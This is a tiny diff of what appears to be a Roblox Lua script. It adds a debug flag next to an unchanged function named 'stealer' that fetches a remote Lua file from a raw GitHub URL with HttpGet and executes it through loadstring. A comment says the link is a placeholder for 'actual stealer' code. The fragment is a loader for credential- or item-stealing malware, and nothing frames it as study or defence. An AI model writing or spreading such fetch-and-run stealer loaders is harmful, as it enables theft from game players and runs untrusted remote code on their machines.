@@ -1,3 +1,4 @@
+debuging = true
 local function stealer()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reiizarr7-tech/redesigned-meme/refs/heads/main/SSS%2B.LUA"))() -- replace with actual stealer
 end
